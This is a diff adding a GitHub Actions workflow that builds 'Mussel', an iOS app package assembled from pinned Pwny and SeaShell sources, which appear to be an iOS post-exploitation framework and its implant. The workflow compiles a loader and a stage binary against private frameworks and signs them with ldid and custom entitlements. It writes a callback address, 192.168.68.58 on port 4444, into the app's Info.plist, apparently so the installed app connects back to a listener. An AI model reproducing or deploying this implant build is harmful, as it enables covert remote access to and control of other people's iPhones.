@@ -1,0 +1,185 @@
+name: Build Matched Mussel IPA
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: macos-14
+    timeout-minutes: 50
+
+    steps:
+      - name: Checkout pinned Pwny source
+        uses: actions/checkout@v5
+        with:
+          ref: 0efb57f9f80bab3e742d39601154c0ef8653886a
+          fetch-depth: 1
+
+      - name: Checkout matching SeaShell source
+        uses: actions/checkout@v5
+        with:
+          repository: EntySec/SeaShell
+          ref: 8548f9508468fe4ee7e18a0c5497d9963baefdf8
+          path: seashell-source
+          fetch-depth: 1
+
+      - name: Fetch private iOS framework stubs
+        shell: bash
+        run: |
+          set -euo pipefail
+          SDK_REPO="$RUNNER_TEMP/theos-sdks"
+          git init "$SDK_REPO"
+          git -C "$SDK_REPO" remote add origin https://github.com/theos/sdks.git
+          git -C "$SDK_REPO" sparse-checkout init --cone
+          git -C "$SDK_REPO" sparse-checkout set iPhoneOS16.5.sdk
+          git -C "$SDK_REPO" fetch --depth 1 origin 0222fd5413cf4b9af096f37b4621afa2688572f7
+          git -C "$SDK_REPO" checkout --detach FETCH_HEAD
+          PRIVATE_FW="$SDK_REPO/iPhoneOS16.5.sdk/System/Library/PrivateFrameworks"
+          for framework in BackBoardServices MediaRemote SpringBoardServices BulletinBoard; do
+            test -f "$PRIVATE_FW/$framework.framework/$framework.tbd"
+          done
+          echo "PRIVATE_FRAMEWORKS=$PRIVATE_FW" >> "$GITHUB_ENV"
+
+      - name: Set up Apple build environment
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "SDK=$(xcrun --sdk iphoneos --show-sdk-path)" >> "$GITHUB_ENV"
+          xcodebuild -version
+          xcrun --sdk iphoneos --show-sdk-version
+
+      - name: Install build utilities
+        shell: bash
+        run: |
+          set -euo pipefail
+          if brew tap | grep -qx "aws/tap"; then
+            brew untap aws/tap
+          fi
+          brew install autoconf automake libtool cmake ldid
+
+      - name: Pin compatible Mbed TLS
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          path = Path("make/Makefile.mbedtls")
+          text = path.read_text()
+          old = "git clone https://github.com/mbed-tls/mbedtls mbed-tls;"
+          new = (
+              "git clone --depth 1 --branch mbedtls-2.28.9 "
+              "https://github.com/mbed-tls/mbedtls mbed-tls;"
+          )
+          if old not in text:
+              raise SystemExit("Expected Mbed TLS clone command was not found.")
+          path.write_text(text.replace(old, new))
+          PY
+
+      - name: Build shared iOS dependencies
+        shell: bash
+        run: |
+          set -euo pipefail
+          chmod +x toolchain/make/ios_arm64.sh
+          make -C make clean
+          make -C make PLATFORM=ios ARCH=arm64 MAKE_TOOLCHAIN_FILE=../toolchain/make/ios_arm64.sh
+
+      - name: Enable Objective-C for Mussel's loader source
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          path = Path("CMakeLists.txt")
+          text = path.read_text()
+          if "enable_language(OBJC)" not in text:
+              marker = "cmake_minimum_required"
+              start = text.find(marker)
+              if start < 0:
+                  raise SystemExit("Could not find cmake_minimum_required().")
+              line_end = text.find("\n", start)
+              if line_end < 0:
+                  raise SystemExit("Malformed CMakeLists.txt.")
+              text = text[:line_end + 1] + "enable_language(OBJC)\n" + text[line_end + 1:]
+              path.write_text(text)
+          PY
+
+      - name: Build matching received file
+        shell: bash
+        run: |
+          set -euo pipefail
+          sed -i '' '/PrivateFrameworks/d' toolchain/cmake/ios_arm64.cmake
+          cmake -S . -B build-stage \
+            -DCMAKE_TOOLCHAIN_FILE="$PWD/toolchain/cmake/ios_arm64.cmake" \
+            -DCMAKE_OSX_SYSROOT="$SDK" \
+            -DCMAKE_OSX_DEPLOYMENT_TARGET=14.0 \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DCMAKE_EXE_LINKER_FLAGS="-F${PRIVATE_FRAMEWORKS}" \
+            -DMAIN=ON \
+            -DSOURCE="$PWD/src/main/main.c"
+          cmake --build build-stage --parallel
+          cp build-stage/main.app/main aarch64.bin
+
+      - name: Build matching Mussel loader
+        shell: bash
+        run: |
+          set -euo pipefail
+          cmake -S . -B build-mussel \
+            -DCMAKE_TOOLCHAIN_FILE="$PWD/toolchain/cmake/ios_arm64.cmake" \
+            -DCMAKE_OSX_SYSROOT="$SDK" \
+            -DCMAKE_OSX_DEPLOYMENT_TARGET=14.0 \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DCMAKE_EXE_LINKER_FLAGS="-F${PRIVATE_FRAMEWORKS} -framework Foundation" \
+            -DMAIN=ON \
+            -DSOURCE="$PWD/seashell-source/Mussel/apple_ios/mussel.m"
+          cmake --build build-mussel --parallel
+
+      - name: Build app wrapper and package IPA
+        shell: bash
+        run: |
+          set -euo pipefail
+          APP_DIR="Payload/Mussel.app"
+          mkdir -p "$APP_DIR"
+
+          clang -arch arm64 \
+            -isysroot "$SDK" \
+            -miphoneos-version-min=14.0 \
+            -framework Foundation \
+            -framework UIKit \
+            -lobjc \
+            -o "$APP_DIR/main" \
+            seashell-source/Mussel/apple_ios/main.m
+
+          cp build-mussel/main.app/main "$APP_DIR/mussel"
+          python3 seashell-source/Mussel/apple_ios/deps/plist.py \
+            192.168.68.58 4444 "$APP_DIR/Info.plist"
+
+          ldid -Sseashell-source/Mussel/apple_ios/deps/sign.plist "$APP_DIR/main"
+          ldid -Sseashell-source/Mussel/apple_ios/deps/sign.plist "$APP_DIR/mussel"
+          chmod 755 "$APP_DIR/main" "$APP_DIR/mussel" aarch64.bin
+
+          /usr/bin/zip -qry Mussel-matched.ipa Payload
+
+      - name: Validate matched outputs
+        shell: bash
+        run: |
+          set -euo pipefail
+          file aarch64.bin | grep "Mach-O 64-bit executable arm64"
+          file Payload/Mussel.app/main | grep "Mach-O 64-bit executable arm64"
+          file Payload/Mussel.app/mussel | grep "Mach-O 64-bit executable arm64"
+          test "$(stat -f %z aarch64.bin)" -gt 100000
+          test "$(stat -f %z Payload/Mussel.app/mussel)" -gt 100000
+          plutil -p Payload/Mussel.app/Info.plist
+          shasum -a 256 Mussel-matched.ipa aarch64.bin > SHA256SUMS.txt
+
+      - name: Upload matched set
+        uses: actions/upload-artifact@v4
+        with:
+          name: matched-mussel-ios
+          path: |
+            Mussel-matched.ipa
+            aarch64.bin
+            SHA256SUMS.txt
+          if-no-files-found: error
